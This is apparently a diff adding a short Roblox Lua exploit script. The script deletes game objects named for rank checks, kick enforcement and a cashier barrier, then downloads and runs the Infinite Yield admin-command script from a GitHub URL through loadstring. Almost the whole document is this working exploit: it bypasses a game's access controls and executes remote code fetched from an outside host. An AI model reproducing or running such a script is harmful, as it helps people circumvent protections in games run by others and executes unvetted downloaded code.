@@ -1,0 +1,13 @@
+for i,v in pairs(game.Workspace:GetChildren()) do
+    if v.Name == "RemoveForAll" then
+        v:Destroy()
+    end
+    if v.Name == "KickPlayerIfNotRanked" then
+        v:Destroy()
+    end
+    if v.Name == "CASHIERBLOCK" then
+        v:Destroy()
+    end
+end
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
